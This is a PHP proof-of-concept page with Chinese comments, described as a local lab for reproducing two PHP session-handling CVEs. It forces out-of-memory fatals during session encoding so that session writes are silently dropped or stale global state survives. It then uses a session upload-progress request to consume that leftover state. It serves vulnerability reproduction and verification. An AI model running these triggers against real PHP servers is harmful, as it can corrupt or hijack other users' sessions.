<?php
// gh.php — CVE-2026-109618 / CVE-2026-109619 靶场页（仅用于本机授权实验）。
//
// 角色：
//   ?stage=mk&sid=  建会话页：写入 marker，供 rd 判定后续写盘是否成功。
//   ?stage=p3&sid=  CVE-2026-109618 生产者：$_SESSION 持 4MB 活串，脚本正常
//                   结束；RSHUTDOWN -> php_session_flush -> php_session_encode
//                   序列化需再分配 ~4M => 总量 ~8.5M > 8M，OOM 精确落在
//                   encode 分配点。fatal bailout 被 session RSHUTDOWN 的
//                   zend_try 吞掉 => s_write 永不执行 => 会话写盘被静默
//                   丢弃（"OOM 后 shutdown 拿着半初始化请求状态继续跑"的
//                   公告语义）。5.6.40 EOL，从未修复——与含漏洞的 8.4.26
//                   行为一致；8.4.27 修复后此处会话完整落盘。
//   ?stage=rd&sid=  回读判定页：抬限后回读，pad=0 证明写盘被丢弃。
//   ?producer=1/2  CVE-2026-109619 生产者（残留全局态路线，见下）。
//
// 页面本身不做任何防护性清理 —— 这正是公告描述的生产者/消费者模型
// （"publishes state during application execution after successful startup,
//   reaches a fatal error, and then uses session upload progress as the
//   early consumer"）。

if (isset($_GET['stage'])) {
    $v = $_GET['stage'];
    // sid 透传（use_strict_mode=0，任意格式都接受；探针仍用纯字母数字）
    if (!empty($_GET['sid'])) {
        session_id($_GET['sid']);
    }

    if ($v === 'mk') {
        session_start();
        $_SESSION['marker'] = 'm1';
        echo "mk done\n";
        exit;
    }

    if ($v === 'p3') {
        // 4MB：执行期基线(~0.5M)+4M=4.5M < 8M 通过；RSHUTDOWN encode 需再
        // 造 ~4M 串 => 8.5M > 8M，OOM 精确落在 php_session_encode 分配点。
        // （6MB 时执行期 str_repeat 自身就超限，永远走不到 shutdown 编码。）
        session_start();
        $_SESSION['pad'] = str_repeat('A', 4 * 1024 * 1024);
        echo "published, dying at write\n";
        exit;
    }

    if ($v === 'p3c') {
        // 对照组：同形状但 1MB pad —— encode 时 ~2.5M < 8M 不触发 OOM，
        // 会话应完整落盘（rd 回读 pad=1048576）。证明 p3 的丢盘是
        // "OOM 落在 encode" 精确导致，而非探针/写盘路径本身的问题。
        session_start();
        $_SESSION['pad'] = str_repeat('A', 1 * 1024 * 1024);
        echo "published, no OOM at write\n";
        exit;
    }

    if ($v === 'rd') {
        // 回读判定页抬限：让 ps_read 反序列化 4MB 会话必然成功，输出确定
        // marker/pad —— pad=0 即证明 p3 的 OOM 场景下会话未被写盘（写盘被
        // 静默丢弃）；pad=4194304 证明会话完整落盘（修复版行为）。
        ini_set('memory_limit', '64M');
        session_start();
        $m = isset($_SESSION['marker']) ? $_SESSION['marker'] : '(none)';
        $p = isset($_SESSION['pad']) ? strlen($_SESSION['pad']) : 0;
        echo "marker={$m} pad={$p}\n";
        exit;
    }
    exit;
}

if (isset($_GET['producer'])) {
    $mode = $_GET['producer'];

    if ($mode === '2') {
        // --- 生产者变体 B：fatal 落在 RSHUTDOWN 内部（ps_write 序列化时 OOM）---
        // 思路：$_SESSION 持有 6MB 活字符串（占住 memory_limit 预算），脚本
        // 正常结束；RSHUTDOWN -> php_session_flush -> ps_write 序列化时需要
        // 再分配 ~6MB -> 12MB > 8M -> OOM bailout 发生在模块 RSHUTDOWN 途中。
        // 若 5.6 的 session RSHUTDOWN 没把 flush 包进 zend_try，bailout 会跳过
        // 其后的 php_rshutdown_session_globals -> PS(id)/PS(http_session_vars)
        // 残留到下一请求 —— 8.4 悬空 PS(id) 的直接对应物。
        session_start();
        $_SESSION['pad'] = str_repeat('A', 6 * 1024 * 1024);
        echo "published, dying at write\n";
        exit;
    }

    // --- 生产者变体 A：执行阶段发布 session 状态，随后 fatal 打断 reset ---
    session_start();                       // 发布 PS(http_session_vars)
    $_SESSION['leak'] = str_repeat('A', 1024);
    unset($_SESSION['leak']);              // 状态已发布；fatal 后无人重置

    // 触发执行阶段 OOM fatal：memory_limit=8M，str_repeat 申请 64MB
    // fatal 打断 php_request_shutdown 前的 session reset 语义。
    $x = str_repeat('B', 64 * 1024 * 1024);
    echo "unreachable: " . strlen($x) . "\n";
    exit;
}

if (isset($_GET['consumer']) || isset($_GET['probe'])) {
    // --- 消费者：upload_progress 在 RINIT 前触碰 session 全局态 ---
    // 什么都不做 —— multipart 里的 PHP_SESSION_UPLOAD_PROGRESS 字段
    // 会在 rfc1867 解析阶段自动调用 php_session_initialize()，抢在
    // 正常请求初始化之前消费掉生产者残留的悬空全局态。
    echo "consumer stage\n";
    exit;
}

echo "OK gh.php\n";
